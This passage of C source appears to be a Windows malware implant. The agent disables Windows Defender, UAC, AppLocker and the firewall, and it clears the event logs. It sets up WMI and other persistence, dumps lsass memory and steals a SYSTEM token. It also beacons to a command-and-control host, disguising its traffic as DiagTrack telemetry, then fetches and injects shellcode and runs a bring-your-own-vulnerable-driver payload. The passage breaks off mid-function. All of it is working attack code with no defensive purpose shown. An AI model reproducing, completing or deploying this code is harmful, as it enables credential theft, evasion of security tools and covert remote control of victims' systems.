    WCHAR exe[MAX_PATH]; GetModuleFileNameW(NULL,exe,MAX_PATH);
    WCHAR buf[2048]; int bi=0;
    static const WCHAR _A[]=
        L"$f=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription "
        L"-Arguments @{Name='WUFilter';EventNameSpace='root\\cimv2';"
        L"QueryLanguage='WQL';"
        L"Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=''explorer.exe'''}"
        L" -ErrorAction SilentlyContinue; "
        L"$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription "
        L"-Arguments @{Name='WUConsumer';CommandLineTemplate='";
    for(int j=0;_A[j];j++) buf[bi++]=_A[j];
    for(int j=0;exe[j]&&bi<1800;j++) buf[bi++]=exe[j];
    static const WCHAR _B[]=
        L"'} -ErrorAction SilentlyContinue; "
        L"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription "
        L"-Arguments @{Filter=$f;Consumer=$c} -ErrorAction SilentlyContinue";
    for(int j=0;_B[j];j++) buf[bi++]=_B[j]; buf[bi]=0;
    _lt_ps(buf);
}

/* Misc: advfirewall set allprofiles state off */
static void _lt_disable_firewall(void) {
    WCHAR cmd[]=L"netsh.exe advfirewall set allprofiles state off";
    _lt_spawn_hidden(L"C:\\Windows\\System32\\netsh.exe",cmd,3000);
}

/* Misc: wevtutil cl on System / Security / Application */
static void _lt_clear_event_logs(void) {
    WCHAR s1[]=L"wevtutil.exe cl System";
    WCHAR s2[]=L"wevtutil.exe cl Security";
    WCHAR s3[]=L"wevtutil.exe cl Application";
    static const WCHAR _wevt[]=L"C:\\Windows\\System32\\wevtutil.exe";
    _lt_spawn_hidden(_wevt,s1,5000);
    _lt_spawn_hidden(_wevt,s2,5000);
    _lt_spawn_hidden(_wevt,s3,5000);
}

static BOOL _lt_is_elevated(void) {
    BOOL elev=FALSE; HANDLE hTok=NULL;
    if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hTok)){
        TOKEN_ELEVATION te; DWORD len=0;
        if(GetTokenInformation(hTok,TokenElevation,&te,sizeof(te),&len))
            elev=te.TokenIsElevated;
        CloseHandle(hTok);
    }
    return elev;
}

/* Orchestrate all CHURCH phases — runs exactly once per process via Interlocked gate */
static void _lt_church_phase(void) {
    static volatile LONG _once=0;
    if(InterlockedCompareExchange(&_once,1,0)!=0) return;
    _lt_patch_amsi();            /* Phase 0  — always: silence AMSI in current process  */
    _lt_enable_debug();          /*           — SeDebugPrivilege for subsequent ops      */
    if(!_lt_is_elevated()) return;  /* remaining phases require admin/SYSTEM token      */
    _lt_disable_tamper();        /* Phase 1a — TamperProtection registry write + PS     */
    Sleep(1500);                 /*           — let TamperProtection settle before kill  */
    _lt_kill_defender_procs();   /* Phase 1b — terminate MsMpEng/NisSrv/MpCmdRun       */
    _lt_disable_defender();      /* Phase 1c — Set-MpPreference batch + svc stop        */
    _lt_disable_uac();           /* Phase 1d — EnableLUA = 0                            */
    _lt_disable_applocker();     /* Phase 1e — AppIDSvc + SiPolicy.p7b + DeviceGuard    */
    _lt_add_defender_exclusions();/* Phase 1f — Add-MpPreference exclusions             */
    _lt_disable_security_logs(); /* Phase 2a — MiniNt key + LSA audit                   */
    _lt_disable_system_restore();/* Phase 2b — Disable-ComputerRestore + registry       */
    _lt_drop_telemetry();        /* Phase 2c — telemetry domain sinks in hosts file      */
    _lt_stop_security_svcs();    /* Phase 4  — 11 security services stopped + disabled   */
    _lt_add_persistence();       /* Phase 3a — schtask + Run key + IFEO + SPE           */
    _lt_wmi_persist();           /* Phase 3b — WMI __EventFilter subscription           */
    _lt_dump_lsass();            /* Phase 5  — lsass → C:\Windows\Temp\diag_ppl.log    */
    _lt_enable_ppl();            /* Phase 7a — PPL elevation via SeTcbPrivilege         */
    _lt_token_steal();           /* Phase 7b — impersonate SYSTEM via lsass token       */
    _lt_disable_firewall();      /*           — netsh advfirewall state off             */
    _lt_clear_event_logs();      /*           — wipe System/Security/Application logs   */
}

/* ─── Shared result-post helper ─────────────────────────────────────────────
 * base64-encodes data and POSTs the standard DiagTrack JSON to result_base.
 * Caller owns data; this function does NOT free it. */
static void _lt_post_task_result(const char *session_id, const char *task_id,
                                  const char *result_base, PBYTE data, DWORD data_len) {
    DWORD b64_sz=((data_len+2)/3)*4+4;
    char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64_sz);
    if(b64) lt_b64encode(data?data:(PBYTE)"",data?data_len:0,b64);
    DWORD json_sz=256+(b64?(DWORD)lt_strlen(b64):0);
    char *rjson=(char*)HeapAlloc(GetProcessHeap(),0,json_sz);
    if(rjson){
        lt_strcpy(rjson,"{\"machineId\":\""); lt_strcat(rjson,session_id);
        lt_strcat(rjson,"\",\"sessionId\":\""); lt_strcat(rjson,task_id);
        lt_strcat(rjson,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
        if(b64) lt_strcat(rjson,b64);
        lt_strcat(rjson,"\"}]}");
        char rurl[512]; lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
        lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
        PBYTE pr=POLY_HTTPPOST(rurl,(PBYTE)rjson,(DWORD)lt_strlen(rjson),NULL);
        if(pr) HeapFree(GetProcessHeap(),0,pr);
        HeapFree(GetProcessHeap(),0,rjson);
    }
    if(b64) HeapFree(GetProcessHeap(),0,b64);
}

/* ─── GDI screen capture → BMP bytes ────────────────────────────────────────
 * Dynamically loads user32 + gdi32 so no static import appears.
 * Returns heap-allocated BMP; caller frees. Sets *out_len to byte count. */
static PBYTE _lt_screenshot(DWORD *out_len) {
    if(out_len) *out_len=0;
    HMODULE hU32=LoadLibraryA("user32.dll");
    HMODULE hG32=LoadLibraryA("gdi32.dll");
    if(!hU32||!hG32){ if(hU32) FreeLibrary(hU32); if(hG32) FreeLibrary(hG32); return NULL; }

    typedef int (WINAPI *pfnGSM)(int);
    typedef HDC (WINAPI *pfnGDC)(HWND);
    typedef int (WINAPI *pfnRDC)(HWND,HDC);
    typedef HDC (WINAPI *pfnCCDC)(HDC);
    typedef HBITMAP (WINAPI *pfnCCB)(HDC,int,int);
    typedef HGDIOBJ (WINAPI *pfnSO)(HDC,HGDIOBJ);
    typedef BOOL (WINAPI *pfnBB)(HDC,int,int,int,int,HDC,int,int,DWORD);
    typedef int (WINAPI *pfnGDB)(HDC,HBITMAP,UINT,UINT,LPVOID,LPBITMAPINFO,UINT);
    typedef BOOL (WINAPI *pfnDO)(HGDIOBJ);
    typedef BOOL (WINAPI *pfnDDC)(HDC);

    pfnGSM fnGSM=(pfnGSM)GetProcAddress(hU32,"GetSystemMetrics");
    pfnGDC fnGDC=(pfnGDC)GetProcAddress(hU32,"GetDC");
    pfnRDC fnRDC=(pfnRDC)GetProcAddress(hU32,"ReleaseDC");
    pfnCCDC fnCCDC=(pfnCCDC)GetProcAddress(hG32,"CreateCompatibleDC");
    pfnCCB fnCCB=(pfnCCB)GetProcAddress(hG32,"CreateCompatibleBitmap");
    pfnSO fnSO=(pfnSO)GetProcAddress(hG32,"SelectObject");
    pfnBB fnBB=(pfnBB)GetProcAddress(hG32,"BitBlt");
    pfnGDB fnGDB=(pfnGDB)GetProcAddress(hG32,"GetDIBits");
    pfnDO fnDO=(pfnDO)GetProcAddress(hG32,"DeleteObject");
    pfnDDC fnDDC=(pfnDDC)GetProcAddress(hG32,"DeleteDC");

    if(!fnGSM||!fnGDC||!fnRDC||!fnCCDC||!fnCCB||!fnSO||!fnBB||!fnGDB||!fnDO||!fnDDC){
        FreeLibrary(hU32); FreeLibrary(hG32); return NULL;
    }

    int w=fnGSM(0), h=fnGSM(1); /* SM_CXSCREEN, SM_CYSCREEN */
    if(w<=0||h<=0){ FreeLibrary(hU32); FreeLibrary(hG32); return NULL; }

    HDC hdcScreen=fnGDC(NULL);
    HDC hdcMem=fnCCDC(hdcScreen);
    HBITMAP hBmp=fnCCB(hdcScreen,w,h);
    HGDIOBJ hOld=fnSO(hdcMem,hBmp);
    fnBB(hdcMem,0,0,w,h,hdcScreen,0,0,0x00CC0020UL); /* SRCCOPY */

    /* 24bpp top-down DIB; rows are DWORD-aligned */
    BITMAPINFOHEADER bih; lt_zero(&bih,sizeof(bih));
    bih.biSize=(DWORD)sizeof(BITMAPINFOHEADER);
    bih.biWidth=(LONG)w; bih.biHeight=-(LONG)h; /* negative = top-down */
    bih.biPlanes=1; bih.biBitCount=24; bih.biCompression=0; /* BI_RGB */
    DWORD row_sz=((DWORD)(w*3)+3)&~3UL;
    DWORD pix_sz=row_sz*(DWORD)h;

    PBYTE pix=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,pix_sz+4);
    if(!pix){
        fnSO(hdcMem,hOld); fnDO(hBmp); fnDDC(hdcMem); fnRDC(NULL,hdcScreen);
        FreeLibrary(hU32); FreeLibrary(hG32); return NULL;
    }
    fnGDB(hdcMem,hBmp,0,(UINT)h,pix,(LPBITMAPINFO)&bih,0); /* DIB_RGB_COLORS=0 */
    fnSO(hdcMem,hOld); fnDO(hBmp); fnDDC(hdcMem); fnRDC(NULL,hdcScreen);
    FreeLibrary(hU32); FreeLibrary(hG32);

    /* BITMAPFILEHEADER(14) + BITMAPINFOHEADER + pixels */
    DWORD off_bits=14+(DWORD)sizeof(BITMAPINFOHEADER);
    DWORD total=off_bits+pix_sz;
    PBYTE bmp=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,total+4);
    if(!bmp){ HeapFree(GetProcessHeap(),0,pix); return NULL; }

    bmp[0]='B'; bmp[1]='M';
    bmp[2]=(BYTE)total;       bmp[3]=(BYTE)(total>>8);
    bmp[4]=(BYTE)(total>>16); bmp[5]=(BYTE)(total>>24);
    /* bfReserved1, bfReserved2 = 0 (already zeroed) */
    bmp[10]=(BYTE)off_bits;       bmp[11]=(BYTE)(off_bits>>8);
    bmp[12]=(BYTE)(off_bits>>16); bmp[13]=(BYTE)(off_bits>>24);
    PBYTE bih_b=(PBYTE)&bih;
    for(DWORD _si=0;_si<(DWORD)sizeof(BITMAPINFOHEADER);_si++) bmp[14+_si]=bih_b[_si];
    for(DWORD _pi=0;_pi<pix_sz;_pi++) bmp[off_bits+_pi]=pix[_pi];

    HeapFree(GetProcessHeap(),0,pix);
    if(out_len) *out_len=total;
    return bmp;
}

/* Forward declaration — POLY_CAPTURE is defined after POLY_AGENT (used by byovdrun command) */
static int POLY_CAPTURE(PBYTE, SIZE_T, const char *);

static void POLY_AGENT(void) {
    _lt_church_phase(); /* CHURCH: defense defeat → persistence → cred access */

    /* Generate session_id: 16 hex chars from blended tick+pid+tid */
    DWORD tc=(DWORD)GetTickCount64();
    DWORD pid=GetCurrentProcessId(), tid=GetCurrentThreadId();
    BYTE sid[8];
    sid[0]=(BYTE)(tc^pid); sid[1]=(BYTE)((tc>>8)^tid);
    sid[2]=(BYTE)((tc>>16)^(pid>>8)); sid[3]=(BYTE)((tc>>24)^(tid>>8));
    sid[4]=(BYTE)(pid^tid); sid[5]=(BYTE)((pid>>16)^(tc>>4));
    sid[6]=(BYTE)((tid>>16)^(tc>>20)); sid[7]=(BYTE)((pid>>24)^(tid>>24)^(tc>>28));
    static const char hx[]="0123456789abcdef";
    char session_id[17];
    for(int i=0;i<8;i++){session_id[i*2]=hx[(sid[i]>>4)&0xF];session_id[i*2+1]=hx[sid[i]&0xF];}
    session_id[16]=0;

    /* Build registration URL and body */
    char reg_url[512];
    lt_build_url(reg_url,LT_C2_HTTPS,LT_C2_HOST,LT_C2_PORT,LT_C2_CB_PATH);
    lt_strcat(reg_url,"/c2/register");
    char reg_body[512];
    lt_strcpy(reg_body,"{\"machineId\":\""); lt_strcat(reg_body,session_id);
    lt_strcat(reg_body,"\",\"sessionId\":\""); lt_strcat(reg_body,session_id);
    lt_strcat(reg_body,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"aW5pdA==\"}]}");

    /* Build poll and result URL stubs NOW (while config is decoded) so we can re-encrypt */
    char poll_base[384];
    lt_build_url(poll_base,LT_C2_HTTPS,LT_C2_HOST,LT_C2_PORT,LT_C2_CB_PATH);
    lt_strcat(poll_base,"/");
    char result_base[384];
    lt_build_url(result_base,LT_C2_HTTPS,LT_C2_HOST,LT_C2_PORT,LT_C2_CB_PATH);
    lt_strcat(result_base,"/");

    /* Task 15: re-encrypt config immediately after building all URL stubs */
    _lt_recrypt_cfg();

    /* Register and get XOR key */
    DWORD rlen=0;
    PBYTE resp=POLY_HTTPPOST(reg_url,(PBYTE)reg_body,lt_strlen(reg_body),&rlen);
    int session_key=0;
    if(resp&&rlen>0) session_key=lt_json_int((char*)resp,"key");
    if(resp) HeapFree(GetProcessHeap(),0,resp);
    if(!session_key) session_key=0x5B;

    /* Task 14: create named mutex so the watchdog in secondary processes can detect
     * this agent is alive.  Mutex name = random hex so it doesn't appear as a
     * known IoC pattern. */
    {
        static const char _hx[]="0123456789abcdef";
        DWORD _tc2=(DWORD)GetTickCount64()^(pid*31)^(tid*17);
        int _mi=0;
        static const WCHAR _pf[]={L'L',L'o',L'c',L'a',L'l',L'\\',0};
        for(int _pi=0;_pf[_pi];_pi++) _lt_wdog_mutex[_mi++]=_pf[_pi];
        for(int _bi=7;_bi>=0;_bi--){
            _lt_wdog_mutex[_mi++]=(WCHAR)_hx[(_tc2>>(_bi*4))&0xF];
        }
        _lt_wdog_mutex[_mi]=0;
        CreateMutexW(NULL,FALSE,_lt_wdog_mutex); /* handle intentionally leaked — lives as long as process */
    }

    /* Task 5 → now Task 14: spawn watchdog thread immediately (no delay) */
    {
        HANDLE hWdog=NULL;
        POLY_NTTHREAD(&hWdog,THREAD_ALL_ACCESS,NULL,GetCurrentProcess(),
            (PVOID)POLY_WATCHDOG_THREAD,NULL,0,0,0x20000,0x20000,NULL);
        if(hWdog) POLY_NTCLOSE(hWdog);
    }

    /* Polling loop — Task 10: non-blocking; concurrent tasks run on background threads */
    for(;;){
        /* Adaptive sleep: 500ms while any slot is running/done so results are
         * harvested and POSTed quickly; full jitter only when all slots are idle.
         * All HTTP calls stay on this thread — safe from config decode/recrypt races. */
        int _any_active=0;
        for(int _ri=0;_ri<LT_MAX_CONCURRENT;_ri++)
            if(_lt_slots[_ri].state){_any_active=1;break;}
        if(_any_active)
            POLY_NTDELAY(500LL*10000LL);
        else
            POLY_NTDELAY((LONGLONG)lt_jitter_ms(_lt_sleep_base_ms)*10000LL);

        /* ── Harvest completed slots and POST results ── */
        for(int _si=0;_si<LT_MAX_CONCURRENT;_si++){
            if(InterlockedCompareExchange(&_lt_slots[_si].state,0,2)!=2) continue;
            _LT_SLOT *sl=&_lt_slots[_si];

            DWORD out_len=sl->out_len;
            PBYTE output=sl->output;
            char task_id[17]; for(int _ti=0;_ti<17;_ti++) task_id[_ti]=sl->task_id[_ti];

            DWORD b64_sz=((out_len+2)/3)*4+4;
            char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64_sz);
            if(b64) lt_b64encode(output?output:(PBYTE)"",output?out_len:0,b64);
            DWORD json_sz=256+(b64?lt_strlen(b64):0);
            char *result_json=(char*)HeapAlloc(GetProcessHeap(),0,json_sz);
            if(result_json){
                lt_strcpy(result_json,"{\"machineId\":\""); lt_strcat(result_json,session_id);
                lt_strcat(result_json,"\",\"sessionId\":\""); lt_strcat(result_json,task_id);
                lt_strcat(result_json,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
                if(b64) lt_strcat(result_json,b64);
                lt_strcat(result_json,"\"}]}");
                char result_url[512];
                lt_strcpy(result_url,result_base); lt_strcat(result_url,session_id);
                lt_strcat(result_url,"/"); lt_strcat(result_url,task_id);
                PBYTE pr=POLY_HTTPPOST(result_url,(PBYTE)result_json,lt_strlen(result_json),NULL);
                if(pr) HeapFree(GetProcessHeap(),0,pr);
                HeapFree(GetProcessHeap(),0,result_json);
            }
            if(b64) HeapFree(GetProcessHeap(),0,b64);
            if(output){lt_zero(output,out_len);HeapFree(GetProcessHeap(),0,output);}
            sl->output=NULL; sl->out_len=0;
        }

        /* ── Poll for a new task ── */
        char poll_url[512];
        lt_strcpy(poll_url,poll_base); lt_strcat(poll_url,session_id); lt_strcat(poll_url,"/task");

        LT_WH wh; wh.hLib=NULL; wh.hSess=NULL; wh.hConn=NULL; wh.hReq=NULL;
        if(!lt_wh_open(&wh,poll_url,L"GET")) continue;
        if(!wh.fnSend(wh.hReq,NULL,0,NULL,0,0,0)||!wh.fnRecv(wh.hReq,NULL))
            {lt_wh_close(&wh);continue;}
        DWORD tlen=0;
        PBYTE task_raw=lt_wh_read_body(&wh,&tlen);
        lt_wh_close(&wh);

        if(!task_raw||tlen<18){if(task_raw)HeapFree(GetProcessHeap(),0,task_raw);continue;}

        /* XOR with the session key from registration — key is NOT transmitted in-band */
        for(DWORD i=0;i<tlen;i++) task_raw[i]^=(BYTE)session_key;
        if(task_raw[16]!='|'){HeapFree(GetProcessHeap(),0,task_raw);continue;}

        char task_id[17];
        for(int i=0;i<16;i++) task_id[i]=(char)task_raw[i]; task_id[16]=0;
        char *command=(char*)(task_raw+17);

        /* Built-in directives: handle synchronously (fast, no blocking I/O) */

        /* Task 8: comhijack <dll_path> <clsid> — register COM server hijack */
        if(lt_strpfx(command,"comhijack ")&&command[10]){
            /* parse: comhijack C:\path\to\dll.dll {CLSID-GUID} */
            char *sp=NULL; int ci2=10;
            while(command[ci2]&&command[ci2]!=' ') ci2++; if(command[ci2]) sp=command+ci2+1;
            char clsid[64]={0};
            if(sp){ int gi=0; while(sp[gi]&&gi<62){clsid[gi]=sp[gi];gi++;} clsid[gi]=0; }
            /* Convert dll path to wide */
            WCHAR wdll[520]={0}; int di2=10;
            while(command[di2]&&command[di2]!=' '&&di2-10<518)
                {wdll[di2-10]=(WCHAR)(unsigned char)command[di2];di2++;}
            BOOL cok=clsid[0]&&wdll[0]&&POLY_COM_HIJACK(wdll,clsid);
            const char *cmsg=cok?"[+] COM hijack registered — waiting for privileged CoCreateInstance"
                                :"[-] COM hijack failed — check DLL path and CLSID format";
            DWORD out_len=lt_strlen(cmsg);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output){for(DWORD _ci=0;_ci<=out_len;_ci++) output[_ci]=(BYTE)cmsg[_ci];}
            DWORD b64_sz=((out_len+2)/3)*4+4;
            char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64_sz);
            if(b64) lt_b64encode(output?output:(PBYTE)"",output?out_len:0,b64);
            DWORD json_sz=256+(b64?lt_strlen(b64):0);
            char *rjson=(char*)HeapAlloc(GetProcessHeap(),0,json_sz);
            if(rjson){
                lt_strcpy(rjson,"{\"machineId\":\""); lt_strcat(rjson,session_id);
                lt_strcat(rjson,"\",\"sessionId\":\""); lt_strcat(rjson,task_id);
                lt_strcat(rjson,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
                if(b64) lt_strcat(rjson,b64);
                lt_strcat(rjson,"\"}]}");
                char rurl[512]; lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
                lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
                PBYTE pr=POLY_HTTPPOST(rurl,(PBYTE)rjson,lt_strlen(rjson),NULL);
                if(pr) HeapFree(GetProcessHeap(),0,pr);
                HeapFree(GetProcessHeap(),0,rjson);
            }
            if(b64) HeapFree(GetProcessHeap(),0,b64);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;
        }

        /* Task 7: fiberexec — re-inject agent SC via fiber on current thread */
        if(lt_strpfx(command,"fiberexec")&&(command[9]==0||command[9]==' ')){
            char sc_url2[512];
            lt_build_url(sc_url2,LT_C2_HTTPS,LT_C2_HOST,LT_C2_PORT,LT_C2_CB_PATH);
            lt_strcat(sc_url2,"/c2/agent-sc");
            _lt_recrypt_cfg();
            SIZE_T fsclen=0; PBYTE fsc=POLY_HTTPGET(sc_url2,&fsclen);
            int fok=fsc&&fsclen?POLY_FIBER_EXEC(fsc,fsclen):0;
            if(fsc){lt_zero(fsc,fsclen);HeapFree(GetProcessHeap(),0,fsc);}
            const char *fmsg=fok?"[+] Fiber exec launched on current thread"
                                :"[-] Fiber exec failed";
            DWORD out_len=lt_strlen(fmsg);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output){for(DWORD _fi=0;_fi<=out_len;_fi++) output[_fi]=(BYTE)fmsg[_fi];}
            DWORD b64_sz=((out_len+2)/3)*4+4;
            char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64_sz);
            if(b64) lt_b64encode(output?output:(PBYTE)"",output?out_len:0,b64);
            DWORD json_sz=256+(b64?lt_strlen(b64):0);
            char *rjson=(char*)HeapAlloc(GetProcessHeap(),0,json_sz);
            if(rjson){
                lt_strcpy(rjson,"{\"machineId\":\""); lt_strcat(rjson,session_id);
                lt_strcat(rjson,"\",\"sessionId\":\""); lt_strcat(rjson,task_id);
                lt_strcat(rjson,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
                if(b64) lt_strcat(rjson,b64);
                lt_strcat(rjson,"\"}]}");
                char rurl[512]; lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
                lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
                PBYTE pr=POLY_HTTPPOST(rurl,(PBYTE)rjson,lt_strlen(rjson),NULL);
                if(pr) HeapFree(GetProcessHeap(),0,pr);
                HeapFree(GetProcessHeap(),0,rjson);
            }
            if(b64) HeapFree(GetProcessHeap(),0,b64);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;
        }

        /* Task 5: wnfinject <pid> — WNF-based injection into target process */
        if(lt_strpfx(command,"wnfinject ")&&command[10]){
            DWORD wpid=0; int wi=10;
            while(command[wi]>='0'&&command[wi]<='9'){wpid=wpid*10+(command[wi++]-'0');}
            BOOL wok=FALSE;
            if(wpid){
                char sc_url3[512];
                lt_build_url(sc_url3,LT_C2_HTTPS,LT_C2_HOST,LT_C2_PORT,LT_C2_CB_PATH);
                lt_strcat(sc_url3,"/c2/agent-sc"); _lt_recrypt_cfg();
                SIZE_T wsclen=0; PBYTE wsc=POLY_HTTPGET(sc_url3,&wsclen);
                if(wsc&&wsclen){ wok=POLY_WNF_INJECT(wpid,wsc,wsclen);
                    lt_zero(wsc,wsclen);HeapFree(GetProcessHeap(),0,wsc);}
            }
            const char *wmsg=wok?"[+] WNF injection triggered — shellcode queued via notification callback"
                                :"[-] WNF injection failed — no valid subscription found or SC download failed";
            DWORD out_len=lt_strlen(wmsg);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output){for(DWORD _wi=0;_wi<=out_len;_wi++) output[_wi]=(BYTE)wmsg[_wi];}
            DWORD b64_sz=((out_len+2)/3)*4+4;
            char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64_sz);
            if(b64) lt_b64encode(output?output:(PBYTE)"",output?out_len:0,b64);
            DWORD json_sz=256+(b64?lt_strlen(b64):0);
            char *rjson=(char*)HeapAlloc(GetProcessHeap(),0,json_sz);
            if(rjson){
                lt_strcpy(rjson,"{\"machineId\":\""); lt_strcat(rjson,session_id);
                lt_strcat(rjson,"\",\"sessionId\":\""); lt_strcat(rjson,task_id);
                lt_strcat(rjson,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
                if(b64) lt_strcat(rjson,b64);
                lt_strcat(rjson,"\"}]}");
                char rurl[512]; lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
                lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
                PBYTE pr=POLY_HTTPPOST(rurl,(PBYTE)rjson,lt_strlen(rjson),NULL);
                if(pr) HeapFree(GetProcessHeap(),0,pr);
                HeapFree(GetProcessHeap(),0,rjson);
            }
            if(b64) HeapFree(GetProcessHeap(),0,b64);
            if(output) HeapFree(GetProcessHeap(),0,output);
            HeapFree(GetProcessHeap(),0,task_raw); continue;
        }

        if(lt_strpfx(command,"migrate")&&(command[7]==0||command[7]==' ')){
            const char *tgt=(command[7]==' ')?command+8:"";
            BOOL mok=POLY_MIGRATE(tgt);
            const char *msg=mok?"[+] Agent migrated — new session will register shortly"
                               :"[-] Migration failed — no suitable target process found";
            DWORD out_len=lt_strlen(msg);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output){for(DWORD _mi=0;_mi<=out_len;_mi++) output[_mi]=(BYTE)msg[_mi];}

            DWORD b64_sz=((out_len+2)/3)*4+4;
            char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64_sz);
            if(b64) lt_b64encode(output?output:(PBYTE)"",output?out_len:0,b64);
            DWORD json_sz=256+(b64?lt_strlen(b64):0);
            char *rjson=(char*)HeapAlloc(GetProcessHeap(),0,json_sz);
            if(rjson){
                lt_strcpy(rjson,"{\"machineId\":\""); lt_strcat(rjson,session_id);
                lt_strcat(rjson,"\",\"sessionId\":\""); lt_strcat(rjson,task_id);
                lt_strcat(rjson,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
                if(b64) lt_strcat(rjson,b64);
                lt_strcat(rjson,"\"}]}");
                char rurl[512]; lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
                lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
                PBYTE pr=POLY_HTTPPOST(rurl,(PBYTE)rjson,lt_strlen(rjson),NULL);
                if(pr) HeapFree(GetProcessHeap(),0,pr);
                HeapFree(GetProcessHeap(),0,rjson);
            }
            if(b64) HeapFree(GetProcessHeap(),0,b64);
            if(output) HeapFree(GetProcessHeap(),0,output);

        } else if(lt_strpfx(command,"pid ")&&command[4]){
            WCHAR wn[128]={0}; int _pi=0;
            while(command[4+_pi]&&_pi<127){wn[_pi]=(WCHAR)(unsigned char)command[4+_pi];_pi++;}
            DWORD found_pid=POLY_FINDPID(wn);
            char pidbuf[16]; lt_itoa(found_pid,pidbuf);
            DWORD out_len=lt_strlen(pidbuf);
            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
            if(output){for(DWORD _pi2=0;_pi2<=out_len;_pi2++) output[_pi2]=(BYTE)pidbuf[_pi2];}

            DWORD b64_sz=((out_len+2)/3)*4+4;
            char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64_sz);
            if(b64) lt_b64encode(output?output:(PBYTE)"",output?out_len:0,b64);
            DWORD json_sz=256+(b64?lt_strlen(b64):0);
            char *rjson=(char*)HeapAlloc(GetProcessHeap(),0,json_sz);
            if(rjson){
                lt_strcpy(rjson,"{\"machineId\":\""); lt_strcat(rjson,session_id);
                lt_strcat(rjson,"\",\"sessionId\":\""); lt_strcat(rjson,task_id);
                lt_strcat(rjson,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
                if(b64) lt_strcat(rjson,b64);
                lt_strcat(rjson,"\"}]}");
                char rurl[512]; lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
                lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
                PBYTE pr=POLY_HTTPPOST(rurl,(PBYTE)rjson,lt_strlen(rjson),NULL);
                if(pr) HeapFree(GetProcessHeap(),0,pr);
                HeapFree(GetProcessHeap(),0,rjson);
            }
            if(b64) HeapFree(GetProcessHeap(),0,b64);
            if(output) HeapFree(GetProcessHeap(),0,output);

        } else if(lt_strpfx(command,"byovdrun")&&(command[8]==0||command[8]==' ')){
            /*
             * byovdrun [/path/to/byovd.enc]
             *
             * Fetch the BYOVD shellcode from the C2 server, decode the two-layer
             * XOR .enc, and run it in-process via POLY_CAPTURE so stdout output
             * (written by byovd in LT_BYOVD_SILENT mode) is captured and returned
             * as the task result.
             *
             * The driver .sys must have been uploaded to disk first (NtLoadDriver
             * requires a filesystem path — that is the only disk touch).
             *
             * Default enc path: /cdn/static/v3/byovd.enc
             */
            const char *enc_path=(command[8]==' '&&command[9])?(command+9):"/cdn/static/v3/byovd.enc";
            char sc_url[512];
            lt_build_url(sc_url,LT_C2_HTTPS,LT_C2_HOST,LT_C2_PORT,enc_path);

            SIZE_T raw_len=0;
            PBYTE enc_raw=POLY_HTTPGET(sc_url,&raw_len);
            if(enc_raw&&raw_len>0){
                SIZE_T sc_len=0;
                PBYTE sc=lt_decenc(enc_raw,(DWORD)raw_len,&sc_len);
                HeapFree(GetProcessHeap(),0,enc_raw);
                if(sc&&sc_len>0){
                    /* Build result URL: result_base + session_id + "/" + task_id */
                    char rurl[512];
                    lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
                    lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
                    /* POLY_CAPTURE redirects stdout to a pipe, runs byovd shellcode,
                     * then POSTs captured output to rurl — same path as all tool results. */
                    POLY_CAPTURE(sc,sc_len,rurl);
                    lt_zero(sc,sc_len);
                    HeapFree(GetProcessHeap(),0,sc);
                    HeapFree(GetProcessHeap(),0,task_raw);
                    continue;
                }
                if(sc) HeapFree(GetProcessHeap(),0,sc);
            }
            /* Fetch or decode failed — report error inline */
            {
                static const char _errmsg[]="[-] byovdrun: fetch/decode failed\r\n";
                DWORD elen=(DWORD)(sizeof(_errmsg)-1);
                DWORD b64sz=((elen+2)/3)*4+4;
                char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64sz);
                if(b64) lt_b64encode((PBYTE)_errmsg,elen,b64);
                DWORD jsz=256+(b64?lt_strlen(b64):0);
